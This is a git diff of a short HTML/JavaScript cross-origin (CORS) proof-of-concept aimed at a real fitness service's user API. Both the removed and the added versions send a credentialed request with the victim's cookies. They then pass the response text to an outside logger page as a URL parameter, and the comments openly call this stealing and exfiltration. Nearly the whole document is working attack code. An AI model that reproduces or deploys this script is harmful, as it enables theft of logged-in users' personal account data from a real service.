@@ -1,33 +1,30 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>CORS PoC</title>
-</head>
-<body>
-    <h1>Testing Connection...</h1>
-    <script>
-        // 1. Target endpoint you want to steal data from
-        var targetUrl = 'https://www.myfitnesspal.com/api/services/users';
-        
-        // 2. Where you want to receive the stolen data (e.g., Webhook.site or your server)
-        var loggerUrl = 'https://malikberry007.github.io/cors-poc/';
+<script>
+    var targetUrl = 'https://www.myfitnesspal.com/api/services/users';
+    var loggerUrl = 'https://malikberry007.github.io/cors-poc/';
 
-        var req = new XMLHttpRequest();
-        req.onload = function() {
-            // Encode the data so it doesn't break during transmission
-            var stolenData = encodeURIComponent(this.responseText);
-            
-            // Silently send the data to your logger in the background
-            var logger = new XMLHttpRequest();
-            logger.open('GET', loggerUrl + '?data=' + stolenData, true);
-            logger.send();
-            
-            console.log("Data sent to logger!");
-        };
-        
-        req.open('GET', targetUrl, true);
-        req.withCredentials = true; // Send the victim's cookies
-        req.send();
-    </script>
-</body>
-</html>
+    console.log("🚀 Starting PoC test...");
+
+    var req = new XMLHttpRequest();
+    
+    // This triggers when the request successfully finishes
+    req.onload = function() {
+        console.log("✅ Server responded with status: " + this.status);
+        console.log("📄 Raw Data Data:", this.responseText);
+
+        var stolenData = encodeURIComponent(this.responseText);
+        var logger = new XMLHttpRequest();
+        logger.open('GET', loggerUrl + '?key=' + stolenData, true);
+        logger.send();
+        console.log("📤 Exfiltration request sent to /log");
+    };
+
+    // This triggers if the network request fails completely
+    req.onerror = function() {
+        console.error("❌ The network request failed completely before reaching onload.");
+    };
+
+    req.open('GET', targetUrl, true);
+    req.withCredentials = true;
+    req.send();
+    console.log("📡 Request dispatched to target...");
+</script>
